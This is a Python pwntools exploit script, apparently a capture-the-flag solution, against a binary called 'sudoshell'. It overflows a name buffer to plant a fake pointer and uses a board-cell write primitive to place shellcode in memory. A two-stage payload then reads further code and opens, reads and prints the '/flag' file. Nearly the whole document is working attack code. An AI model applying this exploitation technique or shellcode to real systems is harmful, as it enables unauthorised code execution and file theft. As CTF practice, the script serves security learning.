#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('./sudoshell', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
context.arch = "amd64"

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000401B91
            b* 0x0000000000401C03
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
    sla(b'> ', str(opt).encode())

fake = 0x4041e8
board = 0x4040e0

menu(1)
sa(b"What's your name? ", b'A'*(0x20) + p64(fake)[:7])

def write_byte(p, addr, byte):
    off = addr - board
    row = off // 9
    col = off % 9

    sla(b'> ', f"{row + 1} {col + 1} {byte}".encode())

def write_data(p, addr, data):
    for i, b in enumerate(data):
        if b != 0:
            write_byte(p, addr + i, b)

STAGE1 = 0x4041d0
STAGE2 = 0x404600

sc1 = asm('''
    xor edi, edi
    xor edx, edx
    mov rsi, 0x404600
    mov dl, 0x80
    xor eax, eax
    syscall
    jmp rsi
''')

write_data(p, fake + 8, p64(STAGE1))
write_data(p, STAGE1, sc1)
log.info(f'len: {len(sc1)}')
# GDB()
sla(b"> ", b"0 0 0")

sc2 = asm('''
    mov rbx, 0x67616c662f
    push rbx
    mov rdi, rsp
    xor rdx, rdx
    xor rsi, rsi
    mov rax, 0x02
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x40
    xor rax, rax
    syscall

    mov rdi, 1
    mov rdx, rax
    mov rax, 0x01
    syscall ''')

p.send(sc2)
log.info(f'len: {len(sc2)}')
p.interactive()

# d1nhdwc